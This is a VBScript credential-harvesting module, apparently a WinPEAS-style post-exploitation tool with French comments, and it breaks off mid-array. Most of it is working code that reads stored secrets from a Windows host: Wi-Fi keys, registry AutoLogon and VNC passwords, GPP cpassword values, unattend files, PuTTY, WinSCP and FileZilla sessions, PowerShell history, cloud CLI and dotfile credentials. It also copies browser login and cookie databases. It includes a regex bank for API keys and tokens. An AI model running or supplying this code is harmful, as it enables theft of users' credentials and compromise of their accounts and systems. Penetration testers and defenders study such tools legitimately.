' =========================================================
'  MODULE CREDENTIAL HARVESTER & SECRET SCANNER
' =========================================================

' Globals
Dim g_Regex, g_Patterns, g_Findings, g_ScanStats

Sub InitCredModule()
    Set g_Regex = CreateObject("VBScript.RegExp")
    g_Regex.Global = True
    g_Regex.IgnoreCase = True
    g_Regex.Multiline = True
    g_Findings = ""
    ReDim g_ScanStats(3)  ' 0=files, 1=bytes, 2=hits, 3=skipped
    InitPatterns()
End Sub

Sub InitPatterns()
    ' Tableau 2D : [nom_pattern, regex, sévérité]
    ' Sévérité : CRIT | HIGH | MED | LOW
    g_Patterns = Array( _
        Array("AWS_ACCESS_KEY",      "\b(?:AKIA|ASIA|AIDA|AROA|AIPA|ANPA|ANVA)[A-Z0-9]{16}\b", "CRIT"), _
        Array("AWS_SECRET_KEY",      "aws(.{0,20})?(secret|sk)[""':\s=]+[""']?([A-Za-z0-9/+=]{40})", "CRIT"), _
        Array("AZURE_STORAGE_KEY",   "AccountKey=[A-Za-z0-9+/=]{88}", "CRIT"), _
        Array("AZURE_CONN_STRING",   "DefaultEndpointsProtocol=https;AccountName=[A-Za-z0-9]+;AccountKey=", "CRIT"), _
        Array("GCP_API_KEY",         "AIza[0-9A-Za-z_-]{35}", "CRIT"), _
        Array("GCP_SERVICE_ACCOUNT", """type"":\s*""service_account""", "CRIT"), _
        Array("GITHUB_PAT",          "gh[pousr]_[A-Za-z0-9]{36,255}", "CRIT"), _
        Array("GITHUB_OAUTH",        "gho_[A-Za-z0-9]{36}", "CRIT"), _
        Array("GITLAB_PAT",          "glpat-[A-Za-z0-9_-]{20}", "CRIT"), _
        Array("SLACK_TOKEN",         "xox[baprs]-[A-Za-z0-9-]{10,72}", "CRIT"), _
        Array("SLACK_WEBHOOK",       "https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24}", "HIGH"), _
        Array("DISCORD_WEBHOOK",     "https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+", "HIGH"), _
        Array("DISCORD_TOKEN",       "[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27,38}", "CRIT"), _
        Array("STRIPE_SECRET",       "sk_live_[0-9a-zA-Z]{24,99}", "CRIT"), _
        Array("STRIPE_RESTRICTED",   "rk_live_[0-9a-zA-Z]{24,99}", "CRIT"), _
        Array("TWILIO_SID",          "AC[a-f0-9]{32}", "HIGH"), _
        Array("TWILIO_TOKEN",        "SK[a-f0-9]{32}", "HIGH"), _
        Array("SENDGRID_KEY",        "SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}", "CRIT"), _
        Array("MAILGUN_KEY",         "key-[a-f0-9]{32}", "HIGH"), _
        Array("HEROKU_KEY",          "heroku(.{0,20})?[""'\s:=]+[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}", "HIGH"), _
        Array("NPM_TOKEN",           "npm_[A-Za-z0-9]{36}", "HIGH"), _
        Array("DOCKER_AUTH",         """auths""\s*:\s*\{[^}]*""auth""\s*:\s*""[A-Za-z0-9+/=]+""", "HIGH"), _
        Array("JWT",                 "eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "HIGH"), _
        Array("PRIVATE_KEY_RSA",     "-----BEGIN (RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY-----", "CRIT"), _
        Array("SSH_PRIVATE",         "-----BEGIN OPENSSH PRIVATE KEY-----", "CRIT"), _
        Array("PUTTY_PPK",           "PuTTY-User-Key-File-[23]:", "HIGH"), _
        Array("PKCS12",              "-----BEGIN CERTIFICATE-----", "MED"), _
        Array("GENERIC_PASSWORD",    "(?:password|passwd|pwd|secret|passphrase)\s*[:=]\s*[""']?([^\s""'<>]{6,128})[""']?", "MED"), _
        Array("GENERIC_API_KEY",     "(?:api[_-]?key|apikey|access[_-]?token|auth[_-]?token)\s*[:=]\s*[""']?([A-Za-z0-9_\-]{16,})[""']?", "MED"), _
        Array("GENERIC_BEARER",      "bearer\s+[A-Za-z0-9_\-\.=]{20,}", "MED"), _
        Array("CONN_STRING_SQL",     "(?:server|data source)=[^;]+;.*?(?:password|pwd)=[^;""']+", "HIGH"), _
        Array("MONGODB_URI",         "mongodb(?:\+srv)?://[^:]+:[^@]+@[^/]+", "CRIT"), _
        Array("POSTGRES_URI",        "postgres(?:ql)?://[^:]+:[^@]+@[^/\s]+", "CRIT"), _
        Array("MYSQL_URI",           "mysql://[^:]+:[^@]+@[^/\s]+", "CRIT"), _
        Array("REDIS_URI",           "redis://[^:]*:[^@]+@[^/\s]+", "HIGH"), _
        Array("FTP_CREDS",           "ftp://[^:]+:[^@]+@[^/\s]+", "HIGH"), _
        Array("BASIC_AUTH_URL",      "https?://[A-Za-z0-9_\-\.]+:[^@\s]{4,}@[A-Za-z0-9\.\-]+", "HIGH"), _
        Array("EMAIL_WITH_PWD",      "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}[:;]\S{6,}", "MED") _
    )
End Sub

' =========================================================
'  HARVESTER CIBLÉ (style WinPEAS)
' =========================================================

Function Harvest_WiFi()
    ' Extrait les profils WiFi via netsh remplacé par XML direct
    ' Les profils sont dans : C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\
    Dim root, iface, profFolder, profFile, out, ts, content
    out = "=== [WIFI PROFILES] ===" & vbCrLf
    root = "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"
    On Error Resume Next
    If Not g_FSO.FolderExists(root) Then
        Harvest_WiFi = out & "  (dossier absent)" & vbCrLf : Exit Function
    End If
    For Each iface In g_FSO.GetFolder(root).SubFolders
        For Each profFile In iface.Files
            If LCase(g_FSO.GetExtensionName(profFile.Name)) = "xml" Then
                Set ts = g_FSO.OpenTextFile(profFile.Path, 1)
                content = ts.ReadAll : ts.Close
                Dim ssid, keyMat
                ssid = ExtractBetween(content, "<name>", "</name>")
                keyMat = ExtractBetween(content, "<keyMaterial>", "</keyMaterial>")
                out = out & "  SSID : " & ssid & vbCrLf
                If keyMat <> "" Then
                    out = out & "  KEY  : " & keyMat & "  [!! CLAIR]" & vbCrLf
                Else
                    out = out & "  KEY  : (chiffré DPAPI SYSTEM)" & vbCrLf
                End If
                out = out & "  ----" & vbCrLf
            End If
        Next
    Next
    Harvest_WiFi = out
End Function

Function ExtractBetween(src, tagStart, tagEnd)
    Dim p1, p2
    p1 = InStr(src, tagStart)
    If p1 = 0 Then ExtractBetween = "" : Exit Function
    p1 = p1 + Len(tagStart)
    p2 = InStr(p1, src, tagEnd)
    If p2 = 0 Then ExtractBetween = "" : Exit Function
    ExtractBetween = Mid(src, p1, p2 - p1)
End Function

Function Harvest_RDP()
    ' Fichiers .rdp + cmdkey stockés
    Dim out, user, paths, i, folder, f
    out = "=== [RDP FILES] ===" & vbCrLf
    user = g_Shell.ExpandEnvironmentStrings("%USERPROFILE%")
    paths = Array( _
        user & "\Documents", _
        user & "\Desktop", _
        user & "\Downloads", _
        user & "\AppData\Local\Microsoft\Remote Desktop Connection Manager" _
    )
    On Error Resume Next
    For i = 0 To UBound(paths)
        If g_FSO.FolderExists(paths(i)) Then
            Set folder = g_FSO.GetFolder(paths(i))
            For Each f In folder.Files
                If LCase(g_FSO.GetExtensionName(f.Name)) = "rdp" Then
                    Dim ts, c
                    Set ts = g_FSO.OpenTextFile(f.Path, 1)
                    c = ts.ReadAll : ts.Close
                    out = out & "  [+] " & f.Path & vbCrLf
                    out = out & "      " & Replace(c, vbCrLf, vbCrLf & "      ") & vbCrLf
                End If
            Next
        End If
    Next
    Harvest_RDP = out
End Function

Function Harvest_PuTTY()
    ' Clés PuTTY dans le registre + .ppk sur disque
    Dim out, enumKey, subKeys, k, val
    out = "=== [PUTTY SESSIONS] ===" & vbCrLf
    On Error Resume Next
    ' Enumération via WMI StdRegProv
    Dim reg, sessions, session
    Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
    reg.EnumKey &H80000001, "Software\SimonTatham\PuTTY\Sessions", sessions
    If IsArray(sessions) Then
        For Each session In sessions
            out = out & "  [Session] " & session & vbCrLf
            Dim hostName, user2, keyFile
            reg.GetStringValue &H80000001, _
                "Software\SimonTatham\PuTTY\Sessions\" & session, _
                "HostName", hostName
            reg.GetStringValue &H80000001, _
                "Software\SimonTatham\PuTTY\Sessions\" & session, _
                "UserName", user2
            reg.GetStringValue &H80000001, _
                "Software\SimonTatham\PuTTY\Sessions\" & session, _
                "PublicKeyFile", keyFile
            If hostName <> "" Then out = out & "    Host  : " & hostName & vbCrLf
            If user2    <> "" Then out = out & "    User  : " & user2 & vbCrLf
            If keyFile  <> "" Then out = out & "    Key   : " & keyFile & vbCrLf
        Next
    Else
        out = out & "  (aucune session)" & vbCrLf
    End If
    ' SSH known_hosts (registre)
    Dim hostsKeys, hk
    reg.EnumValues &H80000001, "Software\SimonTatham\PuTTY\SshHostKeys", hostsKeys, Null
    If IsArray(hostsKeys) Then
        out = out & "  [Known hosts]" & vbCrLf
        For Each hk In hostsKeys
            out = out & "    " & hk & vbCrLf
        Next
    End If
    Harvest_PuTTY = out
End Function

Function Harvest_Browsers()
    ' Localise les bases SQLite des navigateurs (ne déchiffre pas DPAPI — flag présence)
    Dim out, user, targets, i, t
    out = "=== [BROWSER CREDENTIAL STORES] ===" & vbCrLf
    user = g_Shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    targets = Array( _
        Array("Chrome",  user & "\Google\Chrome\User Data\Default\Login Data"), _
        Array("Chrome",  user & "\Google\Chrome\User Data\Default\Cookies"), _
        Array("Edge",    user & "\Microsoft\Edge\User Data\Default\Login Data"), _
        Array("Edge",    user & "\Microsoft\Edge\User Data\Default\Cookies"), _
        Array("Brave",   user & "\BraveSoftware\Brave-Browser\User Data\Default\Login Data"), _
        Array("Opera",   user & "\..\Roaming\Opera Software\Opera Stable\Login Data"), _
        Array("Firefox", g_Shell.ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles") _
    )
    On Error Resume Next
    For i = 0 To UBound(targets)
        t = targets(i)
        If g_FSO.FileExists(t(1)) Or g_FSO.FolderExists(t(1)) Then
            out = out & "  [+] " & t(0) & " : " & t(1) & vbCrLf
            ' Copie dans %TEMP% (bases verrouillées → copier via Shell.Application VolumeShadowCopy non dispo en VBS)
            Dim dst : dst = g_FSO.GetParentFolderName(WScript.ScriptFullName) & "\" & t(0) & "_" & g_FSO.GetFileName(t(1))
            g_FSO.CopyFile t(1), dst, True
            If Err.Number = 0 Then
                out = out & "      -> copié: " & dst & vbCrLf
            Else
                out = out & "      -> verrouillé (" & Err.Description & ")" & vbCrLf
                Err.Clear
            End If
        End If
    Next
    Harvest_Browsers = out
End Function

Function Harvest_Registry()
    ' Clés de registre contenant souvent des creds
    Dim out, keys, i, v
    out = "=== [REGISTRY CREDENTIAL KEYS] ===" & vbCrLf
    keys = Array( _
        Array("HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities", "SNMP communities"), _
        Array("HKCU\Software\Microsoft\Terminal Server Client\Default\MRU0", "RDP MRU"), _
        Array("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer", "Proxy"), _
        Array("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyUser", "Proxy user"), _
        Array("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName", "AutoLogon user"), _
        Array("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword", "AutoLogon PWD !!"), _
        Array("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultDomainName", "AutoLogon domain"), _
        Array("HKLM\SOFTWARE\RealVNC\vncserver\Password", "RealVNC pwd"), _
        Array("HKCU\Software\TightVNC\Server\Password", "TightVNC pwd"), _
        Array("HKCU\Software\ORL\WinVNC3\Password", "WinVNC pwd"), _
        Array("HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated", "AlwaysInstallElevated (LPE!)"), _
        Array("HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated", "AlwaysInstallElevated (LPE!)") _
    )
    On Error Resume Next
    For i = 0 To UBound(keys)
        Err.Clear
        v = g_Shell.RegRead(keys(i)(0))
        If Err.Number = 0 Then
            out = out & "  [+] " & keys(i)(1) & vbCrLf
            out = out & "      " & keys(i)(0) & vbCrLf
            out = out & "      = " & CStr(v) & vbCrLf
        End If
    Next
    Harvest_Registry = out
End Function

Function Harvest_UnattendXML()
    ' Fichiers d'install automatisée (creds en clair fréquents)
    Dim out, paths, i
    out = "=== [UNATTEND / SYSPREP] ===" & vbCrLf
    paths = Array( _
        "C:\Windows\Panther\Unattend.xml", _
        "C:\Windows\Panther\Unattended.xml", _
        "C:\Windows\Panther\Unattend\Unattend.xml", _
        "C:\Windows\System32\Sysprep\unattend.xml", _
        "C:\Windows\System32\Sysprep\sysprep.xml", _
        "C:\Windows\System32\Sysprep\Panther\unattend.xml", _
        "C:\unattend.xml", _
        "C:\Windows\debug\NetSetup.log" _
    )
    On Error Resume Next
    For i = 0 To UBound(paths)
        If g_FSO.FileExists(paths(i)) Then
            out = out & "  [+] " & paths(i) & vbCrLf
            Dim ts, c
            Set ts = g_FSO.OpenTextFile(paths(i), 1)
            c = ts.ReadAll : ts.Close
            ' Extraction ciblée
            Dim pwd : pwd = ExtractBetween(c, "<Password>", "</Password>")
            If pwd <> "" Then
                out = out & "      Password tag: " & pwd & vbCrLf
            End If
            Dim val2 : val2 = ExtractBetween(c, "<Value>", "</Value>")
            If val2 <> "" Then out = out & "      Value tag   : " & val2 & vbCrLf
        End If
    Next
    Harvest_UnattendXML = out
End Function

Function Harvest_GPP()
    ' Group Policy Preferences (groups.xml, services.xml, etc.)
    Dim out, roots, i, root
    out = "=== [GPP cpassword] ===" & vbCrLf
    roots = Array( _
        "C:\ProgramData\Microsoft\Group Policy\History", _
        "C:\Windows\SYSVOL\sysvol", _
        "\\" & g_Net.UserDomain & "\SYSVOL" _
    )
    On Error Resume Next
    For i = 0 To UBound(roots)
        If g_FSO.FolderExists(roots(i)) Then
            ScanGPPRecursive g_FSO.GetFolder(roots(i)), out
        End If
    Next
    If out = "=== [GPP cpassword] ===" & vbCrLf Then _
        out = out & "  (aucun fichier GPP trouvé)" & vbCrLf
    Harvest_GPP = out
End Function

Sub ScanGPPRecursive(folder, ByRef out)
    Dim f, sub_
    On Error Resume Next
    For Each f In folder.Files
        If InStr(1, "groups.xml|services.xml|scheduledtasks.xml|datasources.xml|printers.xml|drives.xml", _
                   LCase(f.Name), 1) > 0 Then
            Dim ts, c
            Set ts = g_FSO.OpenTextFile(f.Path, 1)
            c = ts.ReadAll : ts.Close
            Dim cpwd : cpwd = ExtractBetween(c, "cpassword=""", """")
            If cpwd <> "" Then
                out = out & "  [!!] " & f.Path & vbCrLf
                out = out & "       cpassword: " & cpwd & vbCrLf
            End If
        End If
    Next
    For Each sub_ In folder.SubFolders
        ScanGPPRecursive sub_, out
    Next
End Sub

Function Harvest_PowerShellHistory()
    ' ConsoleHost_history.txt — souvent des creds en clair !
    Dim out, path
    out = "=== [POWERSHELL HISTORY] ===" & vbCrLf
    path = g_Shell.ExpandEnvironmentStrings("%APPDATA%") & _
           "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    On Error Resume Next
    If g_FSO.FileExists(path) Then
        Dim ts, c
        Set ts = g_FSO.OpenTextFile(path, 1)
        c = ts.ReadAll : ts.Close
        out = out & "  [+] " & path & vbCrLf
        ' Filtrage des lignes intéressantes
        Dim lines, line, keywords
        lines = Split(c, vbCrLf)
        keywords = Array("password", "pwd", "passw", "secret", "token", "key", _
                         "credential", "apikey", "-p ", "net use", "Invoke-WebRequest", _
                         "ConvertTo-SecureString", "Get-Credential")
        For Each line In lines
            Dim kw, hit : hit = False
            For Each kw In keywords
                If InStr(1, line, kw, 1) > 0 Then hit = True : Exit For
            Next
            If hit Then out = out & "      > " & line & vbCrLf
        Next
    Else
        out = out & "  (historique absent)" & vbCrLf
    End If
    Harvest_PowerShellHistory = out
End Function

Function Harvest_CredManager()
    ' Credential Manager — nom des credentials stockés
    ' Note: extraction DPAPI nécessite API natives (pas accessibles en VBS pur)
    ' On liste juste les entrées via vaultcmd... ou via le registre
    Dim out, path
    out = "=== [CREDENTIAL MANAGER] ===" & vbCrLf
    path = g_Shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Credentials"
    On Error Resume Next
    If g_FSO.FolderExists(path) Then
        Dim f
        For Each f In g_FSO.GetFolder(path).Files
            out = out & "  [+] " & f.Name & " (" & f.Size & " bytes)" & vbCrLf
        Next
    Else
        out = out & "  (dossier absent)" & vbCrLf
    End If
    ' Roaming creds
    Dim path2
    path2 = g_Shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Credentials"
    If g_FSO.FolderExists(path2) Then
        Dim f2
        For Each f2 In g_FSO.GetFolder(path2).Files
            out = out & "  [+] (Roaming) " & f2.Name & " (" & f2.Size & " bytes)" & vbCrLf
        Next
    End If
    ' Vault files
    Dim vaultPath
    vaultPath = g_Shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Vault"
    If g_FSO.FolderExists(vaultPath) Then
        Dim sub_
        For Each sub_ In g_FSO.GetFolder(vaultPath).SubFolders
            out = out & "  [Vault] " & sub_.Name & vbCrLf
        Next
    End If
    Harvest_CredManager = out
End Function

Function Harvest_DPAPI()
    ' Locate DPAPI master keys + protection data
    Dim out, user
    out = "=== [DPAPI MASTER KEYS] ===" & vbCrLf
    user = g_Shell.ExpandEnvironmentStrings("%APPDATA%")
    Dim mkPath
    mkPath = user & "\Microsoft\Protect"
    On Error Resume Next
    If g_FSO.FolderExists(mkPath) Then
        Dim sub2, f3
        For Each sub2 In g_FSO.GetFolder(mkPath).SubFolders
            out = out & "  [SID] " & sub2.Name & vbCrLf
            For Each f3 In sub2.Files
                out = out & "    " & f3.Name & " (" & f3.Size & " bytes)" & vbCrLf
            Next
        Next
    Else
        out = out & "  (non trouvé)" & vbCrLf
    End If
    ' System DPAPI
    If g_FSO.FolderExists("C:\Windows\System32\Microsoft\Protect") Then
        out = out & "  [SYSTEM DPAPI] C:\Windows\System32\Microsoft\Protect exists" & vbCrLf
    End If
    Harvest_DPAPI = out
End Function

Function Harvest_SSH()
    ' .ssh directory keys + config + known_hosts
    Dim out, sshDir
    out = "=== [SSH KEYS & CONFIG] ===" & vbCrLf
    sshDir = g_Shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\.ssh"
    On Error Resume Next
    If g_FSO.FolderExists(sshDir) Then
        Dim f4, ts, firstLine
        For Each f4 In g_FSO.GetFolder(sshDir).Files
            out = out & "  [+] " & f4.Name & " (" & f4.Size & " bytes)" & vbCrLf
            ' Peek first line for private keys
            If f4.Size > 0 And f4.Size < 50000 Then
                Set ts = g_FSO.OpenTextFile(f4.Path, 1)
                firstLine = ts.ReadLine
                ts.Close
                If InStr(firstLine, "PRIVATE KEY") > 0 Then
                    out = out & "      !! PRIVATE KEY DETECTED !!" & vbCrLf
                End If
            End If
        Next
    Else
        out = out & "  (dossier .ssh absent)" & vbCrLf
    End If
    Harvest_SSH = out
End Function

Function Harvest_CloudCLI()
    ' AWS, Azure, GCP CLI credential files
    Dim out, user
    out = "=== [CLOUD CLI CREDENTIALS] ===" & vbCrLf
    user = g_Shell.ExpandEnvironmentStrings("%USERPROFILE%")
    Dim cloudFiles, i
    cloudFiles = Array( _
        Array("AWS credentials",     user & "\.aws\credentials"), _
        Array("AWS config",          user & "\.aws\config"), _
        Array("Azure profile",       user & "\.azure\azureProfile.json"), _
        Array("Azure tokens",        user & "\.azure\accessTokens.json"), _
        Array("Azure msal cache",    user & "\.azure\msal_token_cache.json"), _
        Array("GCP default creds",   user & "\AppData\Roaming\gcloud\credentials.db"), _
        Array("GCP app default",     user & "\AppData\Roaming\gcloud\application_default_credentials.json"), _
        Array("GCP legacy creds",    user & "\AppData\Roaming\gcloud\legacy_credentials"), _
        Array("kubectl config",      user & "\.kube\config"), _
        Array("Docker config",       user & "\.docker\config.json"), _
        Array("Terraform tfstate",   user & "\.terraform.d\credentials.tfrc.json"), _
        Array("Vault token",         user & "\.vault-token"), _
        Array("Heroku netrc",        user & "\_netrc"), _
        Array("OpenStack RC",        user & "\openrc.sh") _
    )
    On Error Resume Next
    For i = 0 To UBound(cloudFiles)
        If g_FSO.FileExists(cloudFiles(i)(1)) Then
            out = out & "  [+] " & cloudFiles(i)(0) & " : " & cloudFiles(i)(1) & vbCrLf
            ' Read small files for pattern scanning
            If g_FSO.GetFile(cloudFiles(i)(1)).Size < 65536 Then
                Dim ts2, c2
                Set ts2 = g_FSO.OpenTextFile(cloudFiles(i)(1), 1)
                c2 = ts2.ReadAll : ts2.Close
                Dim hits2 : hits2 = ScanContent(c2, cloudFiles(i)(1))
                If hits2 <> "" Then out = out & hits2
            End If
        End If
    Next
    Harvest_CloudCLI = out
End Function

Function Harvest_DotFiles()
    ' .env, .netrc, .gitconfig, .npmrc, web.config, appsettings, etc.
    Dim out, user
    out = "=== [DEV/CONFIG DOTFILES] ===" & vbCrLf
    user = g_Shell.ExpandEnvironmentStrings("%USERPROFILE%")
    Dim dotFiles, i
    dotFiles = Array( _
        user & "\.gitconfig", _
        user & "\.git-credentials", _
        user & "\.netrc", _
        user & "\_netrc", _
        user & "\.npmrc", _
        user & "\.env", _
        user & "\.pgpass", _
        user & "\.my.cnf", _
        user & "\.s3cfg", _
        user & "\.boto", _
        user & "\.smbcredentials", _
        user & "\AppData\Roaming\NuGet\NuGet.Config", _
        user & "\AppData\Roaming\pip\pip.ini", _
        user & "\AppData\Roaming\composer\auth.json", _
        user & "\.ruby\credentials" _
    )
    On Error Resume Next
    For i = 0 To UBound(dotFiles)
        If g_FSO.FileExists(dotFiles(i)) Then
            out = out & "  [+] " & dotFiles(i) & vbCrLf
            If g_FSO.GetFile(dotFiles(i)).Size < 65536 Then
                Dim ts3, c3
                Set ts3 = g_FSO.OpenTextFile(dotFiles(i), 1)
                c3 = ts3.ReadAll : ts3.Close
                Dim hits3 : hits3 = ScanContent(c3, dotFiles(i))
                If hits3 <> "" Then out = out & hits3
            End If
        End If
    Next
    Harvest_DotFiles = out
End Function

Function Harvest_IISConfig()
    ' IIS web.config, applicationHost.config, connections strings
    Dim out
    out = "=== [IIS / WEB CONFIG] ===" & vbCrLf
    Dim iisFiles, i
    iisFiles = Array( _
        "C:\inetpub\wwwroot\web.config", _
        "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config", _
        "C:\Windows\System32\inetsrv\config\applicationHost.config" _
    )
    On Error Resume Next
    For i = 0 To UBound(iisFiles)
        If g_FSO.FileExists(iisFiles(i)) Then
            out = out & "  [+] " & iisFiles(i) & vbCrLf
            If g_FSO.GetFile(iisFiles(i)).Size < 524288 Then
                Dim ts4, c4
                Set ts4 = g_FSO.OpenTextFile(iisFiles(i), 1)
                c4 = ts4.ReadAll : ts4.Close
                ' Look for connectionStrings
                Dim cs : cs = ExtractBetween(c4, "<connectionStrings>", "</connectionStrings>")
                If cs <> "" Then
                    out = out & "      [connectionStrings]" & vbCrLf
                    out = out & "      " & cs & vbCrLf
                End If
                Dim hits4 : hits4 = ScanContent(c4, iisFiles(i))
                If hits4 <> "" Then out = out & hits4
            End If
        End If
    Next
    Harvest_IISConfig = out
End Function

Function Harvest_WinSCP()
    ' WinSCP sessions in registry
    Dim out
    out = "=== [WINSCP SESSIONS] ===" & vbCrLf
    On Error Resume Next
    Dim reg2, sessions2, sess
    Set reg2 = GetObject("winmgmts:\\.\root\default:StdRegProv")
    reg2.EnumKey &H80000001, "Software\Martin Prikryl\WinSCP 2\Sessions", sessions2
    If IsArray(sessions2) Then
        For Each sess In sessions2
            Dim hostN, userName, pwdEnc
            reg2.GetStringValue &H80000001, _
                "Software\Martin Prikryl\WinSCP 2\Sessions\" & sess, "HostName", hostN
            reg2.GetStringValue &H80000001, _
                "Software\Martin Prikryl\WinSCP 2\Sessions\" & sess, "UserName", userName
            reg2.GetStringValue &H80000001, _
                "Software\Martin Prikryl\WinSCP 2\Sessions\" & sess, "Password", pwdEnc
            If hostN <> "" Then
                out = out & "  [+] " & sess & vbCrLf
                out = out & "      Host: " & hostN & vbCrLf
                out = out & "      User: " & userName & vbCrLf
                If pwdEnc <> "" Then out = out & "      Pass: " & pwdEnc & " (WinSCP encoded)" & vbCrLf
            End If
        Next
    Else
        out = out & "  (pas de sessions)" & vbCrLf
    End If
    Harvest_WinSCP = out
End Function

Function Harvest_FileZilla()
    ' FileZilla sitemanager.xml + recentservers.xml
    Dim out, appdata
    out = "=== [FILEZILLA] ===" & vbCrLf
    appdata = g_Shell.ExpandEnvironmentStrings("%APPDATA%")
    Dim fzFiles, i
    fzFiles = Array( _
        appdata & "\FileZilla\sitemanager.xml", _
        appdata & "\FileZilla\recentservers.xml", _
        appdata & "\FileZilla\filezilla.xml" _
    )
    On Error Resume Next
    For i = 0 To UBound(fzFiles)
        If g_FSO.FileExists(fzFiles(i)) Then
            out = out & "  [+] " & fzFiles(i) & vbCrLf
            Dim ts5, c5
            Set ts5 = g_FSO.OpenTextFile(fzFiles(i), 1)
            c5 = ts5.ReadAll : ts5.Close
            ' Extract Server blocks
            Dim host5 : host5 = ExtractBetween(c5, "<Host>", "</Host>")
            Dim user5 : user5 = ExtractBetween(c5, "<User>", "</User>")
            Dim pass5 : pass5 = ExtractBetween(c5, "<Pass", "</Pass>")
            If host5 <> "" Then out = out & "      Host: " & host5 & vbCrLf
            If user5 <> "" Then out = out & "      User: " & user5 & vbCrLf
            If pass5 <> "" Then out = out & "      Pass: " & pass5 & vbCrLf
        End If
    Next
    Harvest_FileZilla = out
End Function

Function Harvest_KeePass()
    ' KeePass .kdbx database files
    Dim out
    out = "=== [KEEPASS / PASSWORD MANAGERS] ===" & vbCrLf
    Dim searchPaths, i
    searchPaths = Array( _
        g_Shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents", _
        g_Shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop", _
        g_Shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads" _
    )
    Dim extensions : extensions = Array("kdbx", "kdb", "1pif", "agilekeychain", "opvault", "psafe3", "bwdb")
    On Error Resume Next
    For i = 0 To UBound(searchPaths)
        If g_FSO.FolderExists(searchPaths(i)) Then
            Dim f5
            For Each f5 In g_FSO.GetFolder(searchPaths(i)).Files
                Dim ext : ext = LCase(g_FSO.GetExtensionName(f5.Name))
                Dim j
                For j = 0 To UBound(extensions)
                    If ext = extensions(j) Then
                        out = out & "  [!!] " & f5.Path & " (" & f5.Size & " bytes)" & vbCrLf
                    End If
                Next
            Next
        End If
    Next
    Harvest_KeePass = out
End Function

' =========================================================
'  PATTERN SCANNER ENGINE (TruffleHog-style)
' =========================================================

Function ScanContent(content, filePath)
    ' Scan a string for all credential patterns
    Dim out, i, p, matches
    out = ""
    On Error Resume Next
    For i = 0 To UBound(g_Patterns)
        p = g_Patterns(i)
        g_Regex.Pattern = p(1)
        Set matches = g_Regex.Execute(content)
        If matches.Count > 0 Then
            Dim m
            For Each m In matches
                Dim matchStr : matchStr = Left(m.Value, 120)
                ' Redact middle portion for safety
                If Len(matchStr) > 16 Then
                    matchStr = Left(matchStr, 8) & "..." & Right(matchStr, 8)
                End If
                out = out & "      [" & p(2) & "] " & p(0) & " -> " & matchStr & vbCrLf
                g_ScanStats(2) = g_ScanStats(2) + 1
                ' Store finding
                g_Findings = g_Findings & "[" & p(2) & "] " & p(0) & " in " & filePath & " : " & matchStr & vbCrLf
            Next
        End If
    Next
    ScanContent = out
End Function

Function CalcEntropy(s)
    ' Shannon entropy — detects high-entropy secrets
    Dim freq(255), i, length, ent, p
    length = Len(s)
    If length = 0 Then CalcEntropy = 0 : Exit Function
    For i = 1 To length
        freq(Asc(Mid(s, i, 1))) = freq(Asc(Mid(s, i, 1))) + 1
    Next
    ent = 0
    For i = 0 To 255
        If freq(i) > 0 Then
            p = freq(i) / length
            ent = ent - p * (Log(p) / Log(2))
        End If
    Next
    CalcEntropy = ent
End Function

Function IsBinaryFile(filePath)
    ' Quick check: read first 512 bytes, look for null bytes
    On Error Resume Next
    Dim ts, chunk
    IsBinaryFile = True  ' Default to True (skip) on error
    Set ts = g_FSO.OpenTextFile(filePath, 1)
    If Err.Number <> 0 Then Exit Function
    chunk = ts.Read(512)
    If Err.Number <> 0 Then ts.Close : Exit Function
    ts.Close
    IsBinaryFile = (InStr(chunk, Chr(0)) > 0)
End Function

' =========================================================
'  RECURSIVE DRIVE SCANNER
' =========================================================

Const MAX_FILE_SIZE    = 2097152  ' 2 MB max per file
Const MAX_DEPTH        = 15
Const MAX_TOTAL_FILES  = 50000

' Extensions to scan
Dim g_ScanExts
Sub InitScanExtensions()
    g_ScanExts = Array( _
        "txt", "log", "cfg", "conf", "config", "ini", "xml", "json", "yaml", "yml", _
        "toml", "env", "properties", "prop", "settings", "cnf", "sql", "bak", "old", _
        "sh", "bash", "zsh", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "py", "rb", _
        "pl", "php", "js", "ts", "cs", "java", "go", "rs", "c", "cpp", "h", "hpp", _
        "tf", "tfvars", "hcl", "dockerfile", "compose", "htpasswd", "htaccess", _
        "pgpass", "my", "rdp", "ppk", "pem", "key", "crt", "cer", "pfx", "p12", _
